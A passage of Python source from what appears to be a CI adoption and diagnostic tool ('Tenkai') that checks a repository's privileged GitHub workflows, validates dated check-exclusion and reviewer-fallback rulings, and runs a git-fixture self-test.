            "path in project.verbs.<lane>.test.artifacts; verify with nen shu test-report"))
    if isinstance(workflow.get("coverage"), dict) and "coverage" not in rows:
        out.append(ProductReadiness(
            "workflow/coverage", "coverage captured for the declared ladder", False,
            f"workflow.coverage sets a floor, but lane '{lane}' has no coverage row",
            f"declare an extraction-only project.verbs.{lane}.coverage command or an "
            "explicit unsupported seat; never rerun tests from coverage"))
    if "ui-test" in rows and not project.get("evidence"):
        out.append(ProductReadiness(
            "workflow/evidence", "rendered-state evidence for Mukai", False,
            "a UI test row exists but project.evidence is absent; nen shu evidence refuses",
            "decide which UI states need snapshots and how they reach the PR; declare "
            "project.evidence only after a real capture path exists"))
    return out


class PrivilegedWorkflows(Item):
    """Read-only. Names every OTHER privileged workflow, and the enforcement gap.

    Tenkai installs a `pull_request_target` job — privileged, credentialed — and
    installs NO policy guard. In a consumer with no
    `scripts/workflow_runner_policy_check.rb`, `GuardRegistration` scores `absent`
    as "no ordering constraint", which is true about the ORDERING and says nothing
    about enforcement: the byte-compared same-repo guard, the write-permission
    refusal and the trusted-data rules all live in that script. So the net effect
    of an adoption run on a fresh repository was one new privileged workflow and
    zero new enforcement around it.

    This item does not close that gap — installing the guard is a separate,
    maintainer-owned change. It refuses to let the gap be SILENT: the other
    privileged workflows are named, and § 5 of the skill states what is not
    inherited.
    """

    PRIVILEGED = ("pull_request_target", "workflow_run", "issue_comment", "workflow_call")

    def __init__(self):
        super().__init__("workflows/privileged", "other privileged workflows, and what enforces them", "hatsu")

    def detect(self, ctx):
        d = ctx.repo / ".github" / "workflows"
        if not d.is_dir():
            return self.row(SATISFIED, "no .github/workflows/ directory")
        others = []
        for f in sorted(d.glob("*.y*ml")):
            if f.name == Path(WORKFLOW_PATH).name:
                continue
            live = "\n".join(l for l in f.read_text().splitlines() if not l.lstrip().startswith("#"))
            keys = _on_keys(live) or set()
            hit = sorted(k for k in keys if k in self.PRIVILEGED)
            if hit:
                others.append(f"{f.name} ({', '.join(hit)})")
        guard = "present" if (ctx.repo / GUARD_PATH).is_file() else "ABSENT"
        detail = (f"policy guard {guard}; "
                  + (f"other privileged workflows: {'; '.join(others)}" if others
                     else "no other privileged workflow"))
        if guard == "ABSENT":
            detail += ". Tenkai installs a privileged pull_request_target job and NO guard — "
            detail += "this repository inherits no ongoing enforcement around it"
        return self.row(SATISFIED, detail)

    def repair(self, ctx):
        return self.detect(ctx)   # observation only; it writes nothing, ever


class CheckExclusions(Item):
    """nen/gates.json -> check_exclusions[] (zheref/hatsu#104): a maintainer's ruling that a check is
    not watched has this one declared home. OBSERVATION ONLY -- a lapsed or unpassable row is DRIFT,
    named, for the maintainer to remove or re-rule; Tenkai never rewrites a gate. Hatsu's own key;
    nen keeps it as raw data (validating it is zheref/nen#249).

    What a row must be, because every live row's `name` becomes one argv element of
    `nen pr ready --exclude-check` (SEC-7): the name is letters, digits, spaces, `. _ / ( ) -` and
    nothing else -- no comma (the flag's own separator), no quote, no shell metacharacter, no control
    byte; `ruled` is a YYYY-MM-DD date not in the future; `until` is either a YYYY-MM-DD date or
    `condition: <what lifts it>` -- a near-miss date is refused, never read as a condition, and a
    condition row is re-examined every MAX_CONDITION_DAYS from `ruled`. The day is the declared
    clock's (nen/workflow.json -> reports.timeZone), else the host's, and the detail says which."""

    FIELDS = ("name", "reason", "ruled", "until")
    NAME_OK = re.compile(r"^[A-Za-z0-9 ._/()\-]+$")
    DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")
    CONDITION = "condition: "
    MAX_CONDITION_DAYS = 90

    def __init__(self):
        super().__init__("gates/check-exclusions", "the check-exclusion rulings nen pr ready is handed -- observation only: none lapsed, none unpassable", "hatsu")

    @staticmethod
    def today(ctx):
        import datetime
        tz = None
        try:
            tz = (json.loads((ctx.repo / "nen" / "workflow.json").read_text()).get("reports") or {}).get("timeZone")
        except (OSError, ValueError, AttributeError):
            tz = None
        if isinstance(tz, str) and tz.strip():
            try:
                from zoneinfo import ZoneInfo
                return datetime.datetime.now(ZoneInfo(tz)).date(), f"reports.timeZone {tz}"
            except Exception:
                return datetime.date.today(), f"the host's zone (reports.timeZone {tz!r} unknown here)"
        return datetime.date.today(), "the host's zone (reports.timeZone unset)"

    def detect(self, ctx):
        import datetime
        p = ctx.repo / "nen" / "gates.json"
        if p.is_symlink():
            return self.row(DRIFT, "nen/gates.json is a symlink -- a gate is read as a file of this repository, never through a link",
                            "replace the link with the file")
        if not p.is_file():
            return self.row(SATISFIED, "no nen/gates.json -- nothing declared")
        try:
            doc = json.loads(p.read_text())
        except (ValueError, OSError, UnicodeDecodeError):
            return self.row(ROUTED, "nen/gates.json is not parseable -- nen schema check's row",
                            f"nen schema check --repo {ctx.repo}")
        if not isinstance(doc, dict):
            return self.row(ROUTED, "nen/gates.json is not a JSON object -- nen schema check's row",
                            f"nen schema check --repo {ctx.repo}")
        rows = doc.get("check_exclusions", [])
        if not isinstance(rows, list):
            return self.row(DRIFT, "check_exclusions is not an array",
                            "make it an array of {name, reason, ruled, until} rows, or [] for none")
        if not rows:
            return self.row(SATISFIED, "no check exclusion declared -- an empty array is a decision")
        today, clock = self.today(ctx)
        bad, expired, live = dated_rows(rows, "name", today)
        if bad:
            return self.row(DRIFT, "malformed -- " + "; ".join(bad) + " -- a row that cannot be passed safely is never put on the call",
                            "complete the row as the $check_exclusions note shapes it, or remove it")
        if expired:
            return self.row(DRIFT, f"lapsed ({clock}): " + "; ".join(expired) + " -- the ruling has lapsed and the check is watched again",
                            "remove the row, or re-rule it with today's date")
        return self.row(SATISFIED, f"live ({clock}): " + "; ".join(live))

    def repair(self, ctx):
        # a lapsed or malformed ruling is the maintainer's to remove or re-rule; Tenkai never rewrites a gate
        return self.detect(ctx)


def dated_rows(rows, name_key, today, name_ok=CheckExclusions.NAME_OK, max_days=CheckExclusions.MAX_CONDITION_DAYS):
    """The one validator both dated-ruling keys share (check_exclusions, reviewer_fallback.exhausted):
    returns (bad, expired, live) descriptions. A near-miss date is refused, never read as a condition."""
    import datetime
    bad, expired, live = [], [], []
    fields = (name_key, "reason", "ruled", "until")
    for i, r in enumerate(rows):
        if not isinstance(r, dict) or any(not isinstance(r.get(k), str) or not r.get(k).strip() for k in fields):
            bad.append(f"row {i}: every row carries {name_key}, reason, ruled and until, non-empty strings")
            continue
        name, ruled_s, until = r[name_key], r["ruled"], r["until"]
        if not name_ok.match(name):
            bad.append(f"row {i}: {name_key} carries a character no argv element is handed (a comma, a quote, a shell metacharacter or a control byte)")
            continue
        if not CheckExclusions.DATE.match(ruled_s):
            bad.append(f"row {i}: ruled is not a YYYY-MM-DD date")
            continue
        try:
            ruled = datetime.date.fromisoformat(ruled_s)
        except ValueError:
            bad.append(f"row {i}: ruled is not a real date")
            continue
        if ruled > today:
            bad.append(f"row {i}: ruled is in the future")
            continue
        if CheckExclusions.DATE.match(until):
            try:
                d = datetime.date.fromisoformat(until)
            except ValueError:
                bad.append(f"row {i}: until is not a real date")
                continue
            (expired if d < today else live).append(f"{name} (until {until})")
        elif until.startswith(CheckExclusions.CONDITION) and until[len(CheckExclusions.CONDITION):].strip():
            age = (today - ruled).days
            if age > max_days:
                expired.append(f"{name} ({until}; ruled {ruled_s}, {age} days ago -- unconfirmed past {max_days} days)")
            else:
                live.append(f"{name} ({until}; ruled {ruled_s})")
        else:
            bad.append(f"row {i}: until is neither a YYYY-MM-DD date nor 'condition: <what lifts it>'")
    return bad, expired, live


class ReviewerFallback(Item):
    """nen/gates.json -> reviewer_fallback (the ruling of 2026-09-29): the chain holds reviewer identities
    only, `terminal` is the local hanten rounds, and exhausted[] rows are dated rulings that lapse.
    OBSERVATION ONLY. nen reads none of it (zheref/nen#275)."""

    TERMINAL = "hanten"

    def __init__(self):
        super().__init__("gates/reviewer-fallback", "the reviewer fallback chain -- observation only: identities in the chain, a live exhaustion, the terminal", "hatsu")

    def detect(self, ctx):
        p = ctx.repo / "nen" / "gates.json"
        if p.is_symlink():
            return self.row(DRIFT, "nen/gates.json is a symlink -- a gate is read as a file of this repository, never through a link", "replace the link with the file")
        if not p.is_file():
            return self.row(SATISFIED, "no nen/gates.json -- nothing declared")
        try:
            doc = json.loads(p.read_text())
        except (ValueError, OSError, UnicodeDecodeError):
            return self.row(ROUTED, "nen/gates.json is not parseable -- nen schema check's row", f"nen schema check --repo {ctx.repo}")
        if not isinstance(doc, dict):
            return self.row(ROUTED, "nen/gates.json is not a JSON object -- nen schema check's row", f"nen schema check --repo {ctx.repo}")
        fb = doc.get("reviewer_fallback")
        if fb is None:
            return self.row(SATISFIED, "no reviewer_fallback declared -- the configured reviewers are the whole gate")
        if not isinstance(fb, dict):
            return self.row(DRIFT, "reviewer_fallback is not an object", "shape it as {chain: [identities], terminal: 'hanten', exhausted: [rows]}")
        identities = set()
        for r in doc.get("reviewers") or []:
            if isinstance(r, dict) and isinstance(r.get("name"), str):
                identities.add(r["name"].lower())
        chain = fb.get("chain")
        if not isinstance(chain, list) or not chain or any(not isinstance(c, str) or not c.strip() for c in chain):
            return self.row(DRIFT, "chain is not a non-empty array of reviewer names", "list the reviewer identities in fallback order")
        if fb.get("terminal") != self.TERMINAL:
            return self.row(DRIFT, f"terminal is {fb.get('terminal')!r}, not {self.TERMINAL!r} -- the terminal is the local hanten rounds, never a reviewer", "set terminal to 'hanten'")
        if self.TERMINAL in [c.lower() for c in chain]:
            return self.row(DRIFT, "the chain names the terminal as if it were a reviewer identity", "keep 'hanten' in terminal only")
        rows = fb.get("exhausted", [])
        if not isinstance(rows, list):
            return self.row(DRIFT, "exhausted is not an array", "make it an array of {reviewer, reason, ruled, until} rows, or [] for none")
        today, clock = CheckExclusions.today(ctx)
        bad, expired, live = dated_rows(rows, "reviewer", today)
        for i, r in enumerate(rows):
            if isinstance(r, dict) and isinstance(r.get("reviewer"), str) and r["reviewer"].lower() not in [c.lower() for c in chain]:
                bad.append(f"row {i}: reviewer {r['reviewer']!r} is not in the chain")
        if bad:
            return self.row(DRIFT, "malformed -- " + "; ".join(bad) + " -- a row that cannot be read is not honoured", "complete the row as the reviewer_fallback note shapes it, or remove it")
        missing = [c for c in chain if c.lower() not in identities]
        if expired:
            return self.row(DRIFT, f"lapsed ({clock}): " + "; ".join(expired) + " -- the ruling has lapsed and the reviewer is requested again", "remove the row, or re-rule it with today's date")
        if missing:
            return self.row(ROUTED, f"live ({clock}): " + ("; ".join(live) or "no exhaustion") + f"; chain step(s) with no identity in reviewers[]: {', '.join(missing)} -- passed over until declared",
                            "declare each reviewer's identity in nen/gates.json reviewers[] once its app is installed")
        return self.row(SATISFIED, f"live ({clock}): " + ("; ".join(live) or "no exhaustion") + "; every chain step has an identity")

    def repair(self, ctx):
        # a lapsed ruling or an undeclared identity is the maintainer's; Tenkai never rewrites a gate
        return self.detect(ctx)


def items(ctx):
    out = [NenDeclaration(path, what) for path, what in NEN_DECLARATIONS]
    out.append(ColorsFile())
    out.append(IgnoredDir("dirs/reports", "Reports", "where the retained final Rikugan report is written"))
    out.append(IgnoredDir("dirs/nen-state", ".nen", "where the hanten cycle ledger, the stop marker and every Hatsu-made worktree (.nen/worktrees/<surface>/) live"))
    out.append(IgnoredDir("dirs/claude-worktrees", ".claude/worktrees", "where Claude Code's own isolation places its worktrees -- the one harness-native exception to .nen/worktrees/<surface>/ (ruling of 2026-09-30)"))
    out.append(NenCommitMsgHook())
    out.append(GuardRegistration())
    out.append(ReadinessWorkflow())
    out.append(ReleasePublisher())
    review_scopes = ReviewScopes()
    out.append(review_scopes)
    if review_scopes.detect(ctx)["state"] == SATISFIED:
        out.append(ReviewLedger())
    if ctx.role != ROLE_PRODUCT:
        out.append(ReleaseRow())
    out.extend(product_lane_items(ctx))
    out.extend(product_workflow_items(ctx))
    out.append(PrivilegedWorkflows())
    out.append(CheckExclusions())
    out.append(ReviewerFallback())
    return out


# --------------------------------------------------------------------------
# Run
# --------------------------------------------------------------------------
GLYPH = {SATISFIED: "ok  ", REPAIRED: "NEW ", MISSING: "MISS", DRIFT: "DRIF",
         ROUTED: "ROUT", STAGED: "STAG", BLOCKED: "BLOK"}


def run(mode, ctx):
    def guarded(it):
        # one item's raise is that item's BLOCKED row, never the whole report's (QA-16: the tool keeps reporting)
        try:
            return it.repair(ctx) if mode == "apply" else it.detect(ctx)
        except Exception as e:  # noqa: BLE001 -- named, not hidden
            return it.row(BLOCKED, f"{type(e).__name__}: {e} -- this item could not be read; the rest of the report stands", None)
    rows = [guarded(it) for it in items(ctx)]
    return {"contract": CONTRACT, "mode": mode, "repo": str(ctx.repo), "slug": ctx.slug,
            "runner": ctx.runner, "items": rows,
            "outstanding": sum(1 for r in rows if r["state"] in OUTSTANDING)}


def report(res, as_json):
    if as_json:
        print(json.dumps(res, indent=2))
        return
    print(f"repository: {res['repo']}")
    print(f"slug:       {res['slug'] or '(unreadable)'}")
    r = res["runner"]
    print(f"runner:     {r['runs_on']} (fallback {r['fallback']}) — {r['reason']}")
    print()
    for row in res["items"]:
        print(f"  {GLYPH[row['state']]}  {row['id']}")
        print(f"        {row['detail']}")
        if row["action"] and row["state"] in OUTSTANDING:
            print(f"        → {row['action']}")
    print()
    n = res["outstanding"]
    if n == 0:
        print("every item is satisfied — this repository is a working Hatsu consumer.")
    else:
        print(f"{n} item(s) outstanding. Re-run `apply` after settling the routed and staged ones.")


# --------------------------------------------------------------------------
# Self-test — real fixtures, both directions, no network.
# --------------------------------------------------------------------------
def self_test() -> int:
    root = Path(os.environ["TENKAI_DEFAULT_ROOT"])
    failures = []
    checks_run = 0

    def check(name, cond, detail=""):
        nonlocal checks_run
        checks_run += 1
        print(f"  {'ok  ' if cond else 'FAIL'}  {name}" + (f" — {detail}" if detail and not cond else ""))
        if not cond:
            failures.append(name)

    print("runner derivation — the ruling, in both directions")
    check("public + 0 runners -> hosted", derive_runner("public", 0)["runs_on"] == HOSTED_RUNNER)
    check("public + 5 runners -> hosted (fork exposure, and no bill)",
          derive_runner("public", 5)["runs_on"] == HOSTED_RUNNER)
    check("private + 0 runners -> hosted (never queue on an absent runner)",
          derive_runner("private", 0)["runs_on"] == HOSTED_RUNNER)
    check("private + 1 runner  -> self-hosted", derive_runner("private", 1)["runs_on"] == "self-hosted")
    check("unknown visibility  -> hosted, never a guess", derive_runner(None, 3)["runs_on"] == HOSTED_RUNNER)
    check("every derivation names a real fallback",
          all(derive_runner(v, n)["fallback"] == HOSTED_RUNNER
              for v in (None, "public", "private") for n in (0, 1, 9)))
    check("zheref/hatsu's own measured facts derive hosted",
          derive_runner("public", 0)["runs_on"] == HOSTED_RUNNER)

    def fixture(slug="acme/widget", with_guard=None, registered=False, role=ROLE_PROCESS):
        d = Path(tempfile.mkdtemp(prefix="tenkai-fixture-"))
        if role is not None:
            (d / "nen").mkdir(parents=True, exist_ok=True)
            key = "maintained_tools" if role == ROLE_PROCESS else "consumers"
            (d / "nen" / "repos.json").write_text(json.dumps({key: [{"repo": slug}]}))
        _FIXTURES.append(d)
        subprocess.run(["git", "-C", str(d), "init", "-q"], check=True)
        subprocess.run(["git", "-C", str(d), "remote", "add", "origin",
                        f"https://github.com/{slug}.git"], check=True)
        if with_guard:
            g = d / GUARD_PATH
            g.parent.mkdir(parents=True, exist_ok=True)
            body = "# guard — a COMMENT naming pr-readiness.yml must NOT count\n"
            for const in ("EXPECTED_JOBS", "EXPECTED_TYPES", "EXPECTED_STEPS"):
                body += f"{const} = {{" + ("'pr-readiness.yml' => 1" if registered else "") + "}.freeze\n"
            g.write_text(body)
        return d

    def ctx_for(d, slug="acme/widget", vis="private", sh=2, labels="[self-hosted, Linux, X64]"):
        return Ctx(d, root, slug, vis, sh, probe=False, runner_labels=labels)

    print("\nreview readiness — branch state is diagnosed, never reset")
    review_repo = fixture()
    review_workflow = review_repo / "nen" / "workflow.json"
    review_workflow.write_text(json.dumps({"branch": {"base": "main"}, "review": {
        "scopes": {"code": {"persona": "nobunaga", "budget": 2, "paths": ["**"]}}}}))
    subprocess.run(["git", "-C", str(review_repo), "switch", "-q", "-c", "topic/review"], check=True)
    review_ctx = ctx_for(review_repo)
    check("declared review scopes are visible", ReviewScopes().detect(review_ctx)["state"] == SATISFIED)
    missing_ledger = ReviewLedger().detect(review_ctx)
    check("a missing effort ledger routes without minting a budget",
          missing_ledger["state"] == ROUTED and "first cycle" in missing_ledger["action"]
          and not (review_repo / ".nen" / "hanten").exists())
    check("Tenkai apply leaves missing review history untouched",
          ReviewLedger().repair(review_ctx)["state"] == ROUTED
          and not (review_repo / ".nen" / "hanten").exists())
    ledger = review_repo / ".nen" / "hanten" / "topic-review.cycle.json"
    ledger.parent.mkdir(parents=True)
    full_reviewers = {p: {"used": 0, "invocations": []} for p in
                      ("nobunaga", "feitan", "chrollo", "phinks", "hisoka", "uvogin", "leorio")}
    full_reviewers["nobunaga"] = {"used": 1, "invocations": [{"outcome": "ran"}]}
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": full_reviewers}))
    check("a matching ledger is reported without changing used counts",
          ReviewLedger().detect(review_ctx)["state"] == SATISFIED
          and json.loads(ledger.read_text())["reviewers"]["nobunaga"]["used"] == 1)
    ledger_src = (root / "scripts" / "hanten_cycle_ledger.sh").read_text()
    maxima_block = re.search(r"DEFAULT_MAXIMA = \{(.*?)\}", ledger_src, re.S)
    late_block = re.search(r"LATE_PERSONAS = frozenset\(\{(.*?)\}\)", ledger_src, re.S)
    check("REVIEW_PERSONAS equals hanten_cycle_ledger.sh's DEFAULT_MAXIMA keys, in order",
          maxima_block is not None
          and tuple(re.findall(r'"([a-z]+)":', maxima_block.group(1))) == REVIEW_PERSONAS)
    check("LATE_REVIEW_PERSONAS equals hanten_cycle_ledger.sh's LATE_PERSONAS",
          late_block is not None
          and set(re.findall(r'"([a-z]+)"', late_block.group(1))) == set(LATE_REVIEW_PERSONAS))
    pre_leorio = {k: v for k, v in full_reviewers.items() if k != "leorio"}
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": pre_leorio}))
    check("a ledger opened before leorio existed is not blocked for his absent row",
          ReviewLedger().detect(review_ctx)["state"] == SATISFIED)
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review",
                                  "personasAtOpen": list(full_reviewers), "reviewers": pre_leorio}))
    check("a ledger opened after leorio existed is blocked for his lost row",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review",
                                  "lateHydrated": ["leorio"], "reviewers": pre_leorio}))
    check("a ledger that hydrated leorio once is blocked for his lost row",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    bad_leorio = json.loads(json.dumps(full_reviewers))
    bad_leorio["leorio"] = {"used": "one", "invocations": []}
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": bad_leorio}))
    check("a present but malformed leorio row is blocked",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    no_feitan = {k: v for k, v in full_reviewers.items() if k != "feitan"}
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": no_feitan}))
    check("a missing row for a non-late persona is still blocked",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": full_reviewers}))
    inconsistent_reviewers = json.loads(json.dumps(full_reviewers))
    inconsistent_reviewers["nobunaga"]["used"] = 0
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": inconsistent_reviewers}))
    check("a used count that contradicts run history is blocked",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review", "reviewers": {}}))
    check("an empty count map is blocked, not treated as a fresh budget",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "another/review", "reviewers": {}}))
    check("a wrong-branch ledger is blocked, never replaced",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    ledger.unlink()
    pr_ledger = ledger.with_name("topic-review-pr7.cycle.json")
    pr_ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review",
                                     "pr": 7, "reviewers": full_reviewers}))
    check("a PR-keyed ledger satisfies the effort without its branch ledger",
          ReviewLedger().detect(review_ctx)["state"] == SATISFIED)
    another_pr = ledger.with_name("topic-review-pr8.cycle.json")
    another_pr.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review",
                                     "pr": 8, "reviewers": full_reviewers}))
    check("multiple PR-keyed ledgers route active-key selection to Hanten",
          ReviewLedger().detect(review_ctx)["state"] == ROUTED)
    another_pr.unlink()
    pr_ledger.write_text(json.dumps({"contract": "hatsu.hanten.cycle/v0.1", "branch": "topic/review",
                                     "pr": 8, "reviewers": full_reviewers}))
    check("wrong PR number in ledger is blocked",
          ReviewLedger().detect(review_ctx)["state"] == BLOCKED)
    review_workflow.write_text("{}")
    check("missing review scopes are routed as configuration",
          ReviewScopes().detect(review_ctx)["state"] == ROUTED)

    print("\ngreenfield — diagnose then apply then apply again")
    d = fixture()
    first = run("diagnose", ctx_for(d))
    check("a bare repository is not a consumer", first["outstanding"] > 0)
    by = {r["id"]: r for r in first["items"]}
    check("the commit-msg hook routes to nen, never written",
          by["hooks/commit-msg"]["state"] == ROUTED)
    # nen/repos.json is PRESENT in the fixture, because the role is read from it —
    # so four route and that one is satisfied. Asserting "all five" would be
    # asserting against a fixture that no longer exists.
    check("every ABSENT nen declaration routes to nen, never hand-written",
          all(by[p]["state"] == ROUTED and "nen scaffold init" in (by[p]["action"] or "")
              for p, _ in NEN_DECLARATIONS if p != "nen/repos.json"))
    check("and the one the fixture provides is satisfied, not routed",
          by["nen/repos.json"]["state"] == SATISFIED)
    check("colors.yml is Hatsu's to write, not routed", by["nen/colors.yml"]["state"] == MISSING)
    check("no guard -> no two-PR ordering", by["guard/registration"]["state"] == SATISFIED)
    check("workflow is merely missing, not staged", by[WORKFLOW_PATH]["state"] == MISSING)

    applied = run("apply", ctx_for(d))
    by = {r["id"]: r for r in applied["items"]}
    check("colors.yml repaired", by["nen/colors.yml"]["state"] == REPAIRED)
    check("Reports/ repaired", by["dirs/reports"]["state"] == REPAIRED)
    check(".nen/ repaired", by["dirs/nen-state"]["state"] == REPAIRED)
    check("workflow repaired", by[WORKFLOW_PATH]["state"] == REPAIRED)
    check("the rendered workflow carries the real slug",
          "github.repository == 'acme/widget'" in (d / WORKFLOW_PATH).read_text())
    check("no @@TOKEN@@ survives rendering", "@@" not in (d / WORKFLOW_PATH).read_text())
    rendered = (d / WORKFLOW_PATH).read_text()
    check("a process repository requires its own guard and dependency pin",
          "TENKAI_GUARD_REQUIRED: true" in rendered
          and "TENKAI_PIN_FALLBACK_ALLOWED: false" in rendered)
    check("private+registered renders the LABELLED set, never a bare self-hosted",
          re.search(r"runs-on:\s*\[self-hosted, Linux, X64\]", (d / WORKFLOW_PATH).read_text()) is not None
          and re.search(r"runs-on:\s*self-hosted\s*$", (d / WORKFLOW_PATH).read_text(), re.M) is None)

    print("\nRUNNER LABELS — a bare `self-hosted` is never rendered")
    dnl = fixture()
    row = run("apply", ctx_for(dnl, labels=None))
    wf = [r for r in row["items"] if r["id"] == WORKFLOW_PATH][0]
    check("private + registered runners with NO labels is BLOCKED", wf["state"] == BLOCKED)
    check("and the refusal names the flag that answers it",
          "--runner-labels" in (wf["action"] or ""))
    check("nothing was written", not (dnl / WORKFLOW_PATH).is_file())
    # Indexed BY ID, never by position: a fixture that says `items[-1]` breaks the
    # moment an item is added, and reports it as a failure of the thing it names.
    pub = {r["id"]: r for r in
           run("apply", ctx_for(fixture(), vis="public", sh=0, labels=None))["items"]}
    check("public still derives hosted and renders fine",
          pub[WORKFLOW_PATH]["state"] == REPAIRED)

    print("\nIDEMPOTENCE — the second apply must write nothing")
    again = run("apply", ctx_for(d))
    hatsu_rows = [r for r in again["items"] if r["owner"] == "hatsu"]
    check("every Hatsu-owned item reports satisfied on the second run",
          all(r["state"] == SATISFIED for r in hatsu_rows),
          str([(r["id"], r["state"]) for r in hatsu_rows if r["state"] != SATISFIED]))
    check("nothing is reported repaired on the second run",
          not any(r["state"] == REPAIRED for r in again["items"]))
    third = run("apply", ctx_for(d))
    check("a third run is identical to the second",
          [r["state"] for r in third["items"]] == [r["state"] for r in again["items"]])

    print("\nDRIFT REPAIR — present and quietly wrong is the interesting case")
    w = d / WORKFLOW_PATH
    w.write_text(w.read_text().replace("github.repository == 'acme/widget'",
                                       "github.repository == 'zheref/hatsu'"))
    row = ReadinessWorkflow().detect(ctx_for(d))
    check("a foreign slug is DRIFT, not satisfied", row["state"] == DRIFT)
    check("the silent-skip consequence is named, not just the mismatch", "SKIPPED" in row["detail"])
    ReadinessWorkflow().repair(ctx_for(d))
    check("the slug is repaired", ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    w.write_text(w.read_text().replace("runs-on: [self-hosted, Linux, X64]", "runs-on: ubuntu-latest"))
    check("a runner that no longer matches the derivation is DRIFT",
          ReadinessWorkflow().detect(ctx_for(d))["state"] == DRIFT)
    ReadinessWorkflow().repair(ctx_for(d))
    check("the runner is repaired to the derived value",
          ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    w.write_text(w.read_text().replace('--gates "$PWD/.trusted/nen/gates.json"', ""))
    row = ReadinessWorkflow().detect(ctx_for(d))
    check("a dropped --gates is DRIFT", row["state"] == DRIFT and "--gates" in row["detail"])
    ReadinessWorkflow().repair(ctx_for(d))
    check("--gates is restored", ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    # THE SINGLE-TRIGGER BUG, which a consumer would otherwise inherit silently.
    t = re.sub(r"^  pull_request_review:\n(?:    .*\n)*", "", w.read_text(), flags=re.M)
    w.write_text(t)
    row = ReadinessWorkflow().detect(ctx_for(d))
    check("a single-trigger workflow is DRIFT", row["state"] == DRIFT)
    check("and the never-recomputed consequence is named, not just the absence",
          "NEVER recomputed" in row["detail"])
    ReadinessWorkflow().repair(ctx_for(d))
    check("both admitted triggers are restored",
          ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    # THE REGRESSION THAT WOULD HAVE BROKEN EVERY CONSUMER. An earlier version of
    # this engine REQUIRED pull_request_review_thread. It is a webhook event and
    # not an Actions trigger, so a workflow naming it cannot register -- `apply`
    # would have reported a correct workflow as drift and then rendered one that
    # does not run. It must now be refused as firmly as any other non-admitted
    # event, so this fixture is the guard against re-adopting it.
    t = w.read_text().replace(
        "  pull_request_review:\n",
        "  pull_request_review_thread:\n    types: [resolved, unresolved]\n  pull_request_review:\n", 1)
    w.write_text(t)
    row = ReadinessWorkflow().detect(ctx_for(d))
    check("pull_request_review_thread is DRIFT — it cannot register at all",
          row["state"] == DRIFT and "pull_request_review_thread" in row["detail"])
    ReadinessWorkflow().repair(ctx_for(d))
    check("it is removed again by repair",
          ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    # ANOTHER NON-ADMITTED TRIGGER, refused for its own separate reason.
    t = w.read_text().replace("  pull_request_review:\n",
                              "  check_suite:\n    types: [completed]\n  pull_request_review:\n", 1)
    w.write_text(t)
    row = ReadinessWorkflow().detect(ctx_for(d))
    check("check_suite is DRIFT — the set is closed", row["state"] == DRIFT
          and "check_suite" in row["detail"])
    check("and it is named as a ruling, not a style choice",
          "maintainer ruling" in row["detail"])
    ReadinessWorkflow().repair(ctx_for(d))
    check("the admitted set is restored", ReadinessWorkflow().detect(ctx_for(d))["state"] == SATISFIED)

    # THE SHIPPED TEMPLATE ITSELF, checked on its LIVE yaml rather than its prose
    # -- the banner legitimately discusses the event it refuses.
    tmpl = (root / "templates" / "pr-readiness.yml").read_text()
    tmpl_live = "\n".join(l for l in tmpl.splitlines() if not l.lstrip().startswith("#"))
    check("the shipped template declares exactly the admitted two",
          re.findall(r"^  (pull_request[a-z_]*):", tmpl_live, re.M) == list(REQUIRED_TRIGGERS))
    check("the shipped template does NOT name the unregistrable event in live yaml",
          "pull_request_review_thread:" not in tmpl_live)
    check("the shipped template carries the widened CON-32(b) types",
          "review_requested" in tmpl_live and "review_request_removed" in tmpl_live)
    check("the engine mirrors the guard's own ALLOWED_TRIGGERS",
          set(REQUIRED_TRIGGERS) == {"pull_request_target", "pull_request_review"})

    print("\nOWNERSHIP — nen's items are routed, never written")
    hook_row = NenCommitMsgHook().detect(ctx_for(d))
    check("the commit-msg hook is a nen item, not a Hatsu one",
          NenCommitMsgHook().owner == "nen")
    check("an absent hook is ROUTED to nen scaffold init",
          hook_row["state"] == ROUTED and "nen scaffold init" in (hook_row["action"] or ""))
    hooks_dir = ctx_for(d).git_dir / "hooks"
    before_hook = sorted(x.name for x in hooks_dir.iterdir()) if hooks_dir.is_dir() else []
    NenCommitMsgHook().repair(ctx_for(d))
    after_hook = sorted(x.name for x in hooks_dir.iterdir()) if hooks_dir.is_dir() else []
    check("repair writes NO hook — routing is the repair", before_hook == after_hook)
    # BEHAVIOURAL, not source-text: git looks in core.hooksPath when it is set,
    # and an item that reported "installed and current" against the default path
    # while git looked elsewhere is the silent-skip failure this tool exists to end.
    dhp = fixture()
    subprocess.run(["git", "-C", str(dhp), "config", "core.hooksPath", "myhooks"], check=True)
    (dhp / "myhooks").mkdir()
    dest = NenCommitMsgHook._dest(ctx_for(dhp))
    check("core.hooksPath decides where git actually looks",
